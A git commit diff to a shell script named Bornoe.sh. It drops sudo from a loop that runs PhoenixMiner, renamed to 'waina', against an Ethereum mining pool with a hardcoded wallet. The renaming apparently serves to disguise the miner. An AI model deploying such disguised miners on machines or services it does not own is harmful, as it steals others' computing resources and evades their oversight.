e75f98ff3a3b418a97f07643a3f66faad8391d4d
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-07-14 05:32:31 -0600

    Update Bornoe.sh

--- Bornoe.sh
+++ Bornoe.sh
@@ -10,7 +10,7 @@ mv PhoenixMiner waina
 while [ $x -le 20 ]
 do
 
-  sudo ./waina -pool eth.2miners.com:2020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400
+  ./waina -pool eth.2miners.com:2020 -wal 0x079885cbd1569bf0db5af3b8eb6818d963e2309f.PNIX$P -pass x -mi 14 -gt 400
 
 
   x=$(( $x + 1 ))
